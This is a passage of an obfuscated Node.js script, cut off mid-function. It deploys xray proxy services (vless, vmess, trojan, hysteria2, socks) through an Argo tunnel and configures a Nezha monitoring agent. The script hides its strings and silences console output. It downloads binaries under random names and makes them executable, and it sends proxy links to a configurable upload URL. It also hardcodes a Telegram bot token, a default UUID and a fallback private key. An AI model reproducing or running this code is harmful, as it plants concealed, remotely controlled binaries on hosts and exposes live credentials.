#!/usr/bin/env node

const _0x1b63d3 = _0x182c
;(function (_0x26c763, _0x57ebe3) {
  const _0x55a08e = { _0x2bbf27: 0xf6, _0x483cb9: 0x1af, _0x537209: 0x197, _0xf6b55a: 0x151, _0xb46737: 0xb8, _0x4f0ef1: 0x18f },
    _0x4e4cc4 = _0x182c,
    _0x27dfcc = _0x26c763()
  while (!![]) {
    try {
      const _0x22ea94 =
        parseInt(_0x4e4cc4(_0x55a08e._0x2bbf27)) / 0x1 +
        -parseInt(_0x4e4cc4(_0x55a08e._0x483cb9)) / 0x2 +
        parseInt(_0x4e4cc4(0xe8)) / 0x3 +
        (-parseInt(_0x4e4cc4(_0x55a08e._0x537209)) / 0x4) * (-parseInt(_0x4e4cc4(0x11c)) / 0x5) +
        parseInt(_0x4e4cc4(_0x55a08e._0xf6b55a)) / 0x6 +
        parseInt(_0x4e4cc4(_0x55a08e._0xb46737)) / 0x7 +
        -parseInt(_0x4e4cc4(_0x55a08e._0x4f0ef1)) / 0x8
      if (_0x22ea94 === _0x57ebe3) break
      else _0x27dfcc['push'](_0x27dfcc['shift']())
    } catch (_0x24fbbe) {
      _0x27dfcc['push'](_0x27dfcc['shift']())
    }
  }
})(_0x2bd6, 0x57355)
function _0x182c(_0x5ccf66, _0x1c80e2) {
  const _0x2bd6f1 = _0x2bd6()
  return (
    (_0x182c = function (_0x182cee, _0x5866fe) {
      _0x182cee = _0x182cee - 0x94
      let _0x4f2798 = _0x2bd6f1[_0x182cee]
      return _0x4f2798
    }),
    _0x182c(_0x5ccf66, _0x1c80e2)
  )
}
const http = require('http'),
  axios = require('axios'),
  os = require('os'),
  fs = require('fs'),
  path = require(_0x1b63d3(0xc3)),
  crypto = require('crypto'),
  { promisify } = require(_0x1b63d3(0xae)),
  { exec: execCommand, execSync } = require(_0x1b63d3(0x9d)),
  exec = promisify(execCommand),
  PORT = process[_0x1b63d3(0x138)][_0x1b63d3(0x18b)] || 0xbb8,
  SUB_PATH = process[_0x1b63d3(0x138)][_0x1b63d3(0xbf)] || _0x1b63d3(0xf9),
  NAME = process['env'][_0x1b63d3(0xe3)] || _0x1b63d3(0xcc),
  CFIP = process['env'][_0x1b63d3(0xeb)] || _0x1b63d3(0xef),
  CFPORT = process[_0x1b63d3(0x138)][_0x1b63d3(0x18a)] || 0x1bb,
  UPLOAD_URL = process[_0x1b63d3(0x138)][_0x1b63d3(0x12f)] || '',
  PROJECT_URL = process[_0x1b63d3(0x138)]['PROJECT_URL'] || '',
  AUTO_ACCESS = process[_0x1b63d3(0x138)]['AUTO_ACCESS'] || ![],
  FILE_PATH = process[_0x1b63d3(0x138)][_0x1b63d3(0xdd)] || _0x1b63d3(0xc9),
  NEZHA_SERVER = process['env'][_0x1b63d3(0x11e)] || _0x1b63d3(0x169),
  NEZHA_PORT = process[_0x1b63d3(0x138)][_0x1b63d3(0xf1)] || '',
  NEZHA_KEY = process['env'][_0x1b63d3(0xbd)] || _0x1b63d3(0x194),
  UUID = process[_0x1b63d3(0x138)][_0x1b63d3(0x131)] || '41f9af48-8b98-48c7-87cb-773037919255',
  ARGO_AUTH = process[_0x1b63d3(0x138)][_0x1b63d3(0x17b)] || _0x1b63d3(0x19b),
  ARGO_DOMAIN = process[_0x1b63d3(0x138)][_0x1b63d3(0xf2)] || _0x1b63d3(0x15f),
  ARGO_PORT = process[_0x1b63d3(0x138)]['ARGO_PORT'] || 0xe2e1,
  S5_PORT = process[_0x1b63d3(0x138)][_0x1b63d3(0xb5)] || '',
  HY2_PORT = process[_0x1b63d3(0x138)][_0x1b63d3(0x10c)] || '',
  REALITY_PORT = process[_0x1b63d3(0x138)]['REALITY_PORT'] || '',
  CHAT_ID = process[_0x1b63d3(0x138)][_0x1b63d3(0xde)] || _0x1b63d3(0x186),
  BOT_TOKEN = process[_0x1b63d3(0x138)]['BOT_TOKEN'] || '7591685848:AAF1sdGl3DXLdy3llHez0_sDEUC8xBw6D50',
  SHOW_LOG = ![_0x1b63d3(0x100), 'disable', 'no'][_0x1b63d3(0x12a)](
    (process[_0x1b63d3(0x138)][_0x1b63d3(0x184)] || _0x1b63d3(0x100))[_0x1b63d3(0x128)]()
  )
!SHOW_LOG && ((console['log'] = () => {}), (console[_0x1b63d3(0x140)] = () => {}))
function alwaysLog(_0x23898b) {
  process['stdout']['write'](_0x23898b + '\x0a')
}
if (!fs[_0x1b63d3(0xb9)](FILE_PATH)) fs[_0x1b63d3(0x17e)](FILE_PATH)
else {
}
function isValidPort(_0x47af89) {
  const _0x5a678c = { _0x55ee7d: 0x13f },
    _0x179299 = _0x1b63d3
  try {
    if (_0x47af89 === null || _0x47af89 === undefined || _0x47af89 === '') return ![]
    if (typeof _0x47af89 === _0x179299(_0x5a678c._0x55ee7d) && _0x47af89['trim']() === '') return ![]
    const _0x16a256 = parseInt(_0x47af89)
    if (isNaN(_0x16a256)) return ![]
    if (_0x16a256 < 0x1 || _0x16a256 > 0xffff) return ![]
    return !![]
  } catch (_0x1a62d6) {
    return ![]
  }
}
function generateRandomName() {
  const _0x43ee8d = { _0x307b37: 0x12b, _0x353a6b: 0xc6 },
    _0x3255f1 = _0x1b63d3,
    _0x5a0c3d = _0x3255f1(0x1a2)
  let _0x180b7b = ''
  for (let _0x3dc368 = 0x0; _0x3dc368 < 0x6; _0x3dc368++) {
    _0x180b7b += _0x5a0c3d[_0x3255f1(_0x43ee8d._0x307b37)](Math['floor'](Math[_0x3255f1(_0x43ee8d._0x353a6b)]() * _0x5a0c3d[_0x3255f1(0xb2)]))
  }
  return _0x180b7b
}
let subContent = null,
  privateKey = '',
  publicKey = ''
const npmName = generateRandomName(),
  webName = generateRandomName(),
  botName = generateRandomName(),
  phpName = generateRandomName()
let npmPath = path['join'](FILE_PATH, npmName),
  phpPath = path['join'](FILE_PATH, phpName),
  webPath = path[_0x1b63d3(0x198)](FILE_PATH, webName),
  botPath = path[_0x1b63d3(0x198)](FILE_PATH, botName),
  subPath = path[_0x1b63d3(0x198)](FILE_PATH, _0x1b63d3(0x122)),
  listPath = path['join'](FILE_PATH, _0x1b63d3(0x102)),
  bootLogPath = path[_0x1b63d3(0x198)](FILE_PATH, _0x1b63d3(0xe4)),
  configPath = path[_0x1b63d3(0x198)](FILE_PATH, _0x1b63d3(0x174)),
  certPath = path[_0x1b63d3(0x10a)](FILE_PATH, 'cert.pem'),
  keyPath = path[_0x1b63d3(0x10a)](FILE_PATH, 'private.key')
function deleteNodes() {
  const _0x489cc5 = {
      _0x56f7b5: 0xb9,
      _0x47dd5c: 0x195,
      _0x17bae7: 0x12c,
      _0x213ad1: 0x10b,
      _0x2675ed: 0x166,
      _0x1180b2: 0x134,
      _0x36f4a7: 0x11d,
      _0x11d498: 0x113,
      _0x143de7: 0x172
    },
    _0x2f73da = _0x1b63d3
  try {
    if (!UPLOAD_URL) return
    if (!fs[_0x2f73da(_0x489cc5._0x56f7b5)](subPath)) return
    let _0x26b1fe
    try {
      _0x26b1fe = fs[_0x2f73da(_0x489cc5._0x47dd5c)](subPath, _0x2f73da(_0x489cc5._0x17bae7))
    } catch {
      return null
    }
    const _0x113541 = Buffer['from'](_0x26b1fe, _0x2f73da(0x189))[_0x2f73da(_0x489cc5._0x213ad1)](_0x2f73da(0x12c)),
      _0x12c87b = _0x113541[_0x2f73da(_0x489cc5._0x2675ed)]('\x0a')[_0x2f73da(_0x489cc5._0x1180b2)]((_0x1e88e6) =>
        /(vless|vmess|trojan|hysteria2|socks):\/\//[_0x2f73da(0x1b1)](_0x1e88e6)
      )
    if (_0x12c87b[_0x2f73da(0xb2)] === 0x0) return
    return (
      axios[_0x2f73da(_0x489cc5._0x36f4a7)](UPLOAD_URL + _0x2f73da(_0x489cc5._0x11d498), JSON[_0x2f73da(0x1a4)]({ nodes: _0x12c87b }), {
        headers: { 'Content-Type': _0x2f73da(_0x489cc5._0x143de7) }
      })[_0x2f73da(0x19d)]((_0x3c43eb) => {
        return null
      }),
      null
    )
  } catch (_0x4dccff) {
    return null
  }
}
function cleanupOldFiles() {
  const _0x3e4a45 = { _0x133d75: 0x18d },
    _0x1e5a85 = { _0x3fc2d1: 0x198 },
    _0x24559e = _0x1b63d3
  try {
    const _0x51cf38 = fs[_0x24559e(_0x3e4a45._0x133d75)](FILE_PATH)
    _0x51cf38[_0x24559e(0xa2)]((_0x22ccf0) => {
      const _0x234e49 = _0x24559e,
        _0x345675 = path[_0x234e49(_0x1e5a85._0x3fc2d1)](FILE_PATH, _0x22ccf0)
      try {
        const _0x357350 = fs['statSync'](_0x345675)
        _0x357350[_0x234e49(0x15a)]() && fs[_0x234e49(0x185)](_0x345675)
      } catch (_0x5bdfb0) {}
    })
  } catch (_0x1103a6) {}
}
function generateX25519Keypair() {
  const _0x27fc3c = { _0x41a8c2: 0x130, _0x1465f0: 0x13c, _0x21b034: 0x10b },
    _0x223b69 = _0x1b63d3,
    { publicKey: _0x144e6d, privateKey: _0x23b268 } = crypto['generateKeyPairSync'](_0x223b69(0x16e)),
    _0x2a0540 = _0x23b268[_0x223b69(_0x27fc3c._0x41a8c2)]({ type: 'pkcs8', format: _0x223b69(0x13c) })[_0x223b69(0x137)](-0x20),
    _0x1e5971 = _0x144e6d[_0x223b69(_0x27fc3c._0x41a8c2)]({ type: 'spki', format: _0x223b69(_0x27fc3c._0x1465f0) })[_0x223b69(0x137)](-0x20)
  return { privateKey: _0x2a0540[_0x223b69(0x10b)](_0x223b69(0x14d)), publicKey: _0x1e5971[_0x223b69(_0x27fc3c._0x21b034)](_0x223b69(0x14d)) }
}
function generateOrLoadKeyPair() {
  const _0x35ee0d = {
      _0x157129: 0x198,
      _0x380618: 0x16a,
      _0x167a99: 0xb9,
      _0x474362: 0x1a9,
      _0x10d436: 0xfc,
      _0x59d874: 0xc5,
      _0x510152: 0xf3,
      _0x2b5dd1: 0x19e,
      _0x40abbe: 0xf7
    },
    _0x415f39 = _0x1b63d3,
    _0x57642a = path[_0x415f39(_0x35ee0d._0x157129)](FILE_PATH, _0x415f39(_0x35ee0d._0x380618))
  if (fs[_0x415f39(_0x35ee0d._0x167a99)](_0x57642a)) {
    const _0x1536c0 = fs[_0x415f39(0x195)](_0x57642a, _0x415f39(_0x35ee0d._0x474362)),
      _0x2712fc = _0x1536c0['match'](/PrivateKey:\s*(.*)/),
      _0x57a524 = _0x1536c0[_0x415f39(0x1a8)](/PublicKey:\s*(.*)/)
    if (_0x2712fc && _0x57a524) {
      ;((privateKey = _0x2712fc[0x1][_0x415f39(0x152)]()),
        (publicKey = _0x57a524[0x1][_0x415f39(0x152)]()),
        console[_0x415f39(0xc5)](_0x415f39(_0x35ee0d._0x10d436), privateKey),
        console[_0x415f39(_0x35ee0d._0x59d874)](_0x415f39(0xf7), publicKey))
      return
    }
  }
  const _0x823fb5 = generateX25519Keypair()
  ;((privateKey = _0x823fb5[_0x415f39(0x1ad)]),
    (publicKey = _0x823fb5['publicKey']),
    fs[_0x415f39(_0x35ee0d._0x510152)](
      _0x57642a,
      'PrivateKey:\x20' + privateKey + _0x415f39(_0x35ee0d._0x2b5dd1) + publicKey + '\x0a',
      _0x415f39(0x1a9)
    ),
    console[_0x415f39(0xc5)](_0x415f39(0xfc), privateKey),
    console[_0x415f39(_0x35ee0d._0x59d874)](_0x415f39(_0x35ee0d._0x40abbe), publicKey))
}
const FALLBACK_EC_KEY =
    _0x1b63d3(0xea) +
    'BggqhkjOPQMBBw==\x0a' +
    _0x1b63d3(0x159) +
    '-----BEGIN\x20EC\x20PRIVATE\x20KEY-----\x0a' +
    _0x1b63d3(0xe1) +
    _0x1b63d3(0xce) +
    '/TsyLyFoPkhLxSbehH/NBEjHtSZGaDhMqQ==\x0a' +
    _0x1b63d3(0xbe),
  FALLBACK_CERT =
    _0x1b63d3(0x15c) +
    'MIIBejCCASGgAwIBAgIUfWeQL3556PNJLp/veCFxGNj9crkwCgYIKoZIzj0EAwIw\x0a' +
    _0x1b63d3(0x176) +
    'MDIyWjATMREwDwYDVQQDDAhiaW5nLmNvbTBZMBMGByqGSM49AgEGCCqGSM49AwEH\x0a' +
    _0x1b63d3(0xca) +
    _0x1b63d3(0x110) +
    'BfGbgkrMNzAfBgNVHSMEGDAWgBTV1cFID7UISE7PLTBRBfGbgkrMNzAPBgNVHRMB\x0a' +
    _0x1b63d3(0x19c) +
    _0x1b63d3(0x104) +
    '-----END\x20CERTIFICATE-----\x0a'
function ensureTlsCertificates(_0x1a0590, _0x185a3f) {
  const _0x415069 = { _0x12c7d8: 0xb9, _0x1d0e20: 0x17e, _0xaa8388: 0xe2, _0x252cb4: 0x167, _0x5568ce: 0x12d, _0x41c290: 0x1a3, _0x402a8b: 0x14c },
    _0x40c6ff = _0x1b63d3
  if (fs[_0x40c6ff(_0x415069._0x12c7d8)](_0x1a0590) && fs[_0x40c6ff(0xb9)](_0x185a3f)) return
  fs[_0x40c6ff(_0x415069._0x1d0e20)](path[_0x40c6ff(_0x415069._0xaa8388)](_0x1a0590), { recursive: !![] })
  try {
    ;(execSync('openssl\x20version', { stdio: 'ignore' }),
      execSync(_0x40c6ff(_0x415069._0x252cb4) + _0x185a3f + '\x22', { stdio: _0x40c6ff(0x14c) }),
      execSync(_0x40c6ff(_0x415069._0x5568ce) + _0x185a3f + _0x40c6ff(_0x415069._0x41c290) + _0x1a0590 + _0x40c6ff(0x15b), {
        stdio: _0x40c6ff(_0x415069._0x402a8b)
      }))
    return
  } catch (_0x38e30f) {}
  ;(fs['writeFileSync'](_0x185a3f, FALLBACK_EC_KEY), fs['writeFileSync'](_0x1a0590, FALLBACK_CERT))
}
function getCertificateFingerprint(_0x4d4a1a) {
  const _0x30b009 = { _0x4dea43: 0x1a8, _0x19b122: 0xe7, _0x37d18a: 0x95, _0x113f97: 0x165, _0x1bff4b: 0x1a1, _0x271a40: 0x1a8, _0x96c78b: 0x127 },
    _0x49b905 = _0x1b63d3
  try {
    const _0x55ee84 = execSync(_0x49b905(0x147) + _0x4d4a1a + '\x22', { encoding: _0x49b905(0x1a9), timeout: 0xbb8 })[_0x49b905(0x152)](),
      _0x233c75 = _0x55ee84[_0x49b905(_0x30b009._0x4dea43)](/=(.+)$/)
    if (_0x233c75 && _0x233c75[0x1]) return _0x233c75[0x1][_0x49b905(0x127)]()
  } catch (_0x1cec1b) {}
  try {
    const _0x4503f0 = fs['readFileSync'](_0x4d4a1a, _0x49b905(0x1a9)),
      _0x404300 = _0x4503f0[_0x49b905(_0x30b009._0x4dea43)](/-----BEGIN CERTIFICATE-----([\s\S]+?)-----END CERTIFICATE-----/)
    if (!_0x404300) return ''
    const _0x4ad0c2 = _0x404300[0x1]['replace'](/\s/g, ''),
      _0x344d0c = Buffer['from'](_0x4ad0c2, _0x49b905(0x189)),
      _0x3ab872 = crypto[_0x49b905(_0x30b009._0x19b122)](_0x49b905(_0x30b009._0x37d18a))
        [_0x49b905(_0x30b009._0x113f97)](_0x344d0c)
        [_0x49b905(0xe5)](_0x49b905(_0x30b009._0x1bff4b))
    return _0x3ab872[_0x49b905(_0x30b009._0x271a40)](/.{2}/g)[_0x49b905(0x198)](':')[_0x49b905(_0x30b009._0x96c78b)]()
  } catch (_0x36ad02) {
    return (console[_0x49b905(0x140)](_0x49b905(0x187), _0x36ad02), '')
  }
}
async function generateConfig() {
  const _0x3e17b0 = {
      _0x38330a: 0x96,
      _0x2b2b34: 0x119,
      _0x41e861: 0xd6,
      _0x376407: 0xa8,
      _0xd69241: 0xed,
      _0x4bb398: 0x14f,
      _0x4cb7b0: 0x1a0,
      _0x12b3e0: 0xf0,
      _0x392c09: 0x103,
      _0x3daa6d: 0xf0,
      _0x5e4c14: 0xf5,
      _0x2e1c39: 0x14f,
      _0x402c96: 0xd4,
      _0x433101: 0x94,
      _0xe83361: 0x182,
      _0x5899ca: 0x157,
      _0x518710: 0x168,
      _0x40ce0f: 0x13b,
      _0x5ab93b: 0xcf,
      _0x18bbda: 0x16b,
      _0x1b8d51: 0x178,
      _0x2b74a3: 0x168,
      _0xb9bcd3: 0x196,
      _0x24e4e2: 0x106,
      _0x3e0fc9: 0xb6,
      _0x187979: 0xf3,
      _0x44c9b7: 0x174,
      _0x39e694: 0x1a4
    },
    _0x2302f4 = _0x1b63d3,
    _0x111a8e = {
      log: { access: _0x2302f4(_0x3e17b0._0x38330a), error: _0x2302f4(0x96), loglevel: _0x2302f4(0xd6) },
      inbounds: [
        {
          tag: _0x2302f4(0x123),
          port: ARGO_PORT,
          listen: '::',
          protocol: _0x2302f4(_0x3e17b0._0x2b2b34),
          settings: {
            clients: [{ id: UUID, flow: 'xtls-rprx-vision' }],
            decryption: _0x2302f4(_0x3e17b0._0x41e861),
            fallbacks: [
              { dest: 0xbb9 },
              { path: _0x2302f4(0x124), dest: 0xbba },
              { path: _0x2302f4(_0x3e17b0._0x376407), dest: 0xbbb },
              { path: _0x2302f4(0x1ab), dest: 0xbbc }
            ]
          },
          streamSettings: { network: _0x2302f4(0x17d) }
        },
        {
          tag: _0x2302f4(0x109),
          port: 0xbb9,
          listen: '127.0.0.1',
          protocol: 'vless',
          settings: { clients: [{ id: UUID }], decryption: _0x2302f4(0xd6) },
          streamSettings: { network: _0x2302f4(0x17d), security: _0x2302f4(0xd6) }
        },
        {
          tag: _0x2302f4(_0x3e17b0._0xd69241),
          port: 0xbba,
          listen: _0x2302f4(_0x3e17b0._0x4bb398),
          protocol: _0x2302f4(0x119),
          settings: { clients: [{ id: UUID, level: 0x0 }], decryption: _0x2302f4(0xd6) },
          streamSettings: { network: 'ws', security: _0x2302f4(0xd6), wsSettings: { path: _0x2302f4(0x124) } },
          sniffing: {
            enabled: !![],
            destOverride: [_0x2302f4(_0x3e17b0._0x4cb7b0), _0x2302f4(_0x3e17b0._0x12b3e0), _0x2302f4(0xf5)],
            metadataOnly: ![]
          }
        },
        {
          tag: _0x2302f4(0x17f),
          port: 0xbbb,
          listen: _0x2302f4(0x14f),
          protocol: _0x2302f4(_0x3e17b0._0x392c09),
          settings: { clients: [{ id: UUID, alterId: 0x0 }] },
          streamSettings: { network: 'ws', wsSettings: { path: _0x2302f4(0xa8) } },
          sniffing: {
            enabled: !![],
            destOverride: [_0x2302f4(0x1a0), _0x2302f4(_0x3e17b0._0x3daa6d), _0x2302f4(_0x3e17b0._0x5e4c14)],
            metadataOnly: ![]
          }
        },
        {
          tag: _0x2302f4(0x125),
          port: 0xbbc,
          listen: _0x2302f4(_0x3e17b0._0x2e1c39),
          protocol: _0x2302f4(_0x3e17b0._0x402c96),
          settings: { clients: [{ password: UUID }] },
          streamSettings: { network: 'ws', security: _0x2302f4(0xd6), wsSettings: { path: '/trojan-argo' } },
          sniffing: { enabled: !![], destOverride: ['http', 'tls', _0x2302f4(0xf5)], metadataOnly: ![] }
        }
      ],
      dns: { servers: ['https+local://8.8.8.8/dns-query'] },
      outbounds: [
        { protocol: 'freedom', tag: _0x2302f4(0x16f) },
        { protocol: _0x2302f4(_0x3e17b0._0x433101), tag: _0x2302f4(_0x3e17b0._0xe83361) }
      ]
    }
  ;(isValidPort(REALITY_PORT) &&
    _0x111a8e[_0x2302f4(_0x3e17b0._0x5899ca)][_0x2302f4(_0x3e17b0._0x518710)]({
      tag: _0x2302f4(0x9b),
      listen: '::',
      port: parseInt(REALITY_PORT),
      protocol: _0x2302f4(0x119),
      settings: { clients: [{ id: UUID, flow: _0x2302f4(0xa9) }], decryption: _0x2302f4(0xd6) },
      streamSettings: {
        network: _0x2302f4(_0x3e17b0._0x40ce0f),
        security: 'reality',
        realitySettings: {
          show: ![],
          dest: _0x2302f4(0xfa),
          xver: 0x0,
          serverNames: [_0x2302f4(_0x3e17b0._0x5ab93b)],
          privateKey: privateKey,
          shortIds: ['']
        }
      }
    }),
    isValidPort(HY2_PORT) &&
      _0x111a8e[_0x2302f4(_0x3e17b0._0x5899ca)]['push']({
        tag: _0x2302f4(_0x3e17b0._0x18bbda),
        listen: '::',
        port: parseInt(HY2_PORT),
        protocol: 'hysteria',
        settings: { version: 0x2, clients: [{ auth: UUID }] },
        streamSettings: {
          network: _0x2302f4(0x108),
          hysteriaSettings: { version: 0x2, masquerade: { type: 'proxy', url: _0x2302f4(_0x3e17b0._0x1b8d51) } },
          security: 'tls',
          tlsSettings: { alpn: ['h3'], certificates: [{ certificateFile: certPath, keyFile: keyPath }] }
        }
      }),
    isValidPort(S5_PORT) &&
      _0x111a8e['inbounds'][_0x2302f4(_0x3e17b0._0x2b74a3)]({
        tag: _0x2302f4(_0x3e17b0._0xb9bcd3),
        listen: '::',
        port: parseInt(S5_PORT),
        protocol: 'socks',
        settings: {
          auth: _0x2302f4(0xc0),
          accounts: [{ user: UUID[_0x2302f4(_0x3e17b0._0x24e4e2)](0x0, 0x8), pass: UUID[_0x2302f4(_0x3e17b0._0x3e0fc9)](-0xc) }],
          udp: !![]
        }
      }),
    fs[_0x2302f4(_0x3e17b0._0x187979)](
      path[_0x2302f4(0x198)](FILE_PATH, _0x2302f4(_0x3e17b0._0x44c9b7)),
      JSON[_0x2302f4(_0x3e17b0._0x39e694)](_0x111a8e, null, 0x2)
    ))
}
function getSystemArchitecture() {
  const _0x30d748 = { _0x3bb5ef: 0x149, _0x209cce: 0x190, _0x3e502d: 0x14a },
    _0x390f7f = _0x1b63d3,
    _0x505715 = os[_0x390f7f(0x1a5)]()
  return _0x505715 === _0x390f7f(_0x30d748._0x3bb5ef) || _0x505715 === _0x390f7f(0x142) || _0x505715 === _0x390f7f(_0x30d748._0x209cce)
    ? _0x390f7f(_0x30d748._0x3bb5ef)
    : _0x390f7f(_0x30d748._0x3e502d)
}
function downloadFile(_0x30d708, _0x69747, _0x10e9af) {
  const _0x437308 = { _0xf26476: 0x17e, _0x412caa: 0xe6, _0x5eac86: 0xd5, _0x44ba83: 0x19d },
    _0x3124fd = { _0x5054f3: 0xf4 },
    _0x2c1a68 = { _0x37a220: 0x158, _0x477e8b: 0x173, _0xde082a: 0x140 },
    _0x58f43f = { _0x4ceef3: 0xf4 },
    _0x49a2a5 = { _0x43c730: 0xd9 },
    _0x31ee3d = _0x1b63d3,
    _0x585fdc = _0x30d708,
    _0x2d2ef6 = _0x585fdc + '.download'
  !fs['existsSync'](FILE_PATH) && fs[_0x31ee3d(_0x437308._0xf26476)](FILE_PATH, { recursive: !![] })
  const _0x2faa70 = fs[_0x31ee3d(_0x437308._0x412caa)](_0x2d2ef6)
  axios({ method: 'get', url: _0x69747, responseType: _0x31ee3d(_0x437308._0x5eac86) })
    ['then']((_0x316c51) => {
      const _0x1e5266 = _0x31ee3d
      ;(_0x316c51[_0x1e5266(_0x2c1a68._0x37a220)][_0x1e5266(_0x2c1a68._0x477e8b)](_0x2faa70),
        _0x2faa70['on'](_0x1e5266(0xc4), () => {
          const _0x3acfa0 = {
              _0x29ca42: 0xfb,
              _0x5ee6f3: 0x12e,
              _0x4f7002: 0x140,
              _0x2924ac: 0x117,
              _0x5d8f54: 0x114,
              _0x589d69: 0xc5,
              _0x3b8297: 0xfb,
              _0x53a090: 0x133
            },
            _0x327250 = _0x1e5266
          _0x2faa70[_0x327250(_0x49a2a5._0x43c730)]((_0x1fcc1b) => {
            const _0x379816 = _0x327250
            if (_0x1fcc1b) {
              const _0x101bf1 =
                _0x379816(_0x3acfa0._0x29ca42) + path['basename'](_0x585fdc) + _0x379816(_0x3acfa0._0x5ee6f3) + _0x1fcc1b[_0x379816(0x98)]
              ;(fs[_0x379816(0xf4)](_0x2d2ef6, () => {}), console[_0x379816(_0x3acfa0._0x4f7002)](_0x101bf1), _0x10e9af(_0x101bf1))
              return
            }
            try {
              fs[_0x379816(_0x3acfa0._0x2924ac)](_0x2d2ef6, _0x585fdc)
            } catch (_0x2d1322) {
              const _0xec9b74 = _0x379816(0xfb) + path[_0x379816(_0x3acfa0._0x5d8f54)](_0x585fdc) + '\x20failed:\x20' + _0x2d1322[_0x379816(0x98)]
              ;(fs['unlink'](_0x2d2ef6, () => {}), console['error'](_0xec9b74), _0x10e9af(_0xec9b74))
              return
            }
            ;(console[_0x379816(_0x3acfa0._0x589d69)](
              _0x379816(_0x3acfa0._0x3b8297) + path[_0x379816(_0x3acfa0._0x5d8f54)](_0x585fdc) + _0x379816(_0x3acfa0._0x53a090)
            ),
              _0x10e9af(null, _0x585fdc))
          })
        }),
        _0x2faa70['on'](_0x1e5266(_0x2c1a68._0xde082a), (_0x2c9e2e) => {
          const _0x487f8a = _0x1e5266
          fs[_0x487f8a(_0x58f43f._0x4ceef3)](_0x2d2ef6, () => {})
          const _0xfa86bc = _0x487f8a(0xfb) + path['basename'](_0x585fdc) + '\x20failed:\x20' + _0x2c9e2e[_0x487f8a(0x98)]
          ;(console[_0x487f8a(0x140)](_0xfa86bc), _0x10e9af(_0xfa86bc))
        }))
    })
    [_0x31ee3d(_0x437308._0x44ba83)]((_0x2989a1) => {
      const _0x12e669 = _0x31ee3d
      fs[_0x12e669(_0x3124fd._0x5054f3)](_0x2d2ef6, () => {})
      const _0x578a45 = 'Download\x20' + path[_0x12e669(0x114)](_0x585fdc) + _0x12e669(0x12e) + _0x2989a1[_0x12e669(0x98)]
      ;(console[_0x12e669(0x140)](_0x578a45), _0x10e9af(_0x578a45))
    })
}
async function downloadFilesAndRun() {
  const _0x55f9cb = {
      _0xf5db0b: 0x191,
      _0x675cae: 0x9c,
      _0x30e510: 0x166,
      _0x2dfa30: 0x161,
      _0x5c2b39: 0x13d,
      _0x4ef753: 0x181,
      _0x146cb9: 0xa3,
      _0x584ac9: 0xf3,
      _0x92057c: 0x198,
      _0x172575: 0xec,
      _0xb3edb9: 0x1ae,
      _0x135654: 0xc5,
      _0x31bf4e: 0x140,
      _0xcbe9dc: 0x141,
      _0x492424: 0x12a,
      _0x324085: 0x18e,
      _0xf29ff6: 0xa5,
      _0x4e2e8e: 0xd0,
      _0x3b134d: 0xc5,
      _0x46d593: 0x1a8,
      _0x126e83: 0x10a,
      _0x3665db: 0xcb,
      _0x197553: 0x164,
      _0x20ceb7: 0x199,
      _0x42fb83: 0xc5
    },
    _0x1ef52d = { _0xfffccb: 0xa2 },
    _0x3faffe = { _0x103b2c: 0x10b },
    _0x2df6cf = _0x1b63d3,
    _0x61ee34 = getSystemArchitecture(),
    _0x5e1fc4 = getFilesForArchitecture(_0x61ee34)
  if (_0x5e1fc4[_0x2df6cf(0xb2)] === 0x0) {
    console[_0x2df6cf(0xc5)](_0x2df6cf(_0x55f9cb._0xf5db0b))
    return
  }
  const _0x1291e0 = _0x5e1fc4[_0x2df6cf(0x18c)]((_0x5a2443) => {
    return new Promise((_0x2d541c, _0x27af2a) => {
      const _0x2e6977 = { _0x1d0417: 0x148 },
        _0x14da65 = (_0x5d8d89) => {
          const _0x14a9e1 = { _0x2d663b: 0xc5, _0x1a87db: 0x114 },
            _0x591e94 = _0x182c
          downloadFile(_0x5a2443[_0x591e94(_0x2e6977._0x1d0417)], _0x5a2443['fileUrls'][_0x5d8d89], (_0x24d716, _0x23d4ea) => {
            const _0x528119 = _0x591e94
            if (!_0x24d716) {
              _0x2d541c(_0x23d4ea)
              return
            }
            if (_0x5d8d89 + 0x1 < _0x5a2443['fileUrls'][_0x528119(0xb2)]) {
              ;(console[_0x528119(_0x14a9e1._0x2d663b)](
                _0x528119(0x9e) + path[_0x528119(_0x14a9e1._0x1a87db)](_0x5a2443[_0x528119(0x148)]) + _0x528119(0xab)
              ),
                _0x14da65(_0x5d8d89 + 0x1))
              return
            }
            _0x27af2a(_0x24d716)
          })
        }
      _0x14da65(0x0)
    })
  })
  try {
    await Promise[_0x2df6cf(_0x55f9cb._0x675cae)](_0x1291e0)
  } catch (_0x221f5c) {
    console[_0x2df6cf(0x140)]('Error\x20downloading\x20files:', _0x221f5c)
    return
  }
  function _0x32ade7(_0x481f87) {
    const _0x49d76b = _0x2df6cf,
      _0x20f788 = 0x1fd
    _0x481f87[_0x49d76b(_0x1ef52d._0xfffccb)]((_0x41c04c) => {
      const _0x3f9046 = _0x49d76b
      if (fs[_0x3f9046(0xb9)](_0x41c04c))
        try {
          ;(fs['chmodSync'](_0x41c04c, _0x20f788),
            console['log']('Empowerment\x20success\x20for\x20' + _0x41c04c + ':\x20' + _0x20f788[_0x3f9046(_0x3faffe._0x103b2c)](0x8)))
        } catch (_0xf15124) {
          console[_0x3f9046(0x140)]('Empowerment\x20failed\x20for\x20' + _0x41c04c + ':\x20' + _0xf15124)
        }
    })
  }
  const _0x564eba = NEZHA_PORT ? [npmPath, webPath, botPath] : [phpPath, webPath, botPath]
  _0x32ade7(_0x564eba)
  if (NEZHA_SERVER && NEZHA_KEY) {
    if (!NEZHA_PORT) {
      const _0x5a9a17 = NEZHA_SERVER['includes'](':') ? NEZHA_SERVER[_0x2df6cf(_0x55f9cb._0x30e510)](':')[_0x2df6cf(0xcd)]() : '',
        _0x33d35f = new Set([
          _0x2df6cf(0xc8),
          _0x2df6cf(_0x55f9cb._0x2dfa30),
          '2096',
          _0x2df6cf(_0x55f9cb._0x5c2b39),
          _0x2df6cf(0xbc),
          _0x2df6cf(0x14e)
        ]),
        _0x1ec102 = _0x33d35f['has'](_0x5a9a17) ? _0x2df6cf(0xa1) : 'false',
        _0x5b3a25 =
          _0x2df6cf(_0x55f9cb._0x4ef753) +
          NEZHA_KEY +
          _0x2df6cf(0x155) +
          NEZHA_SERVER +
          _0x2df6cf(_0x55f9cb._0x146cb9) +
          _0x1ec102 +
          '\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20' +
          UUID
      fs[_0x2df6cf(_0x55f9cb._0x584ac9)](path[_0x2df6cf(_0x55f9cb._0x92057c)](FILE_PATH, 'config.yaml'), _0x5b3a25)
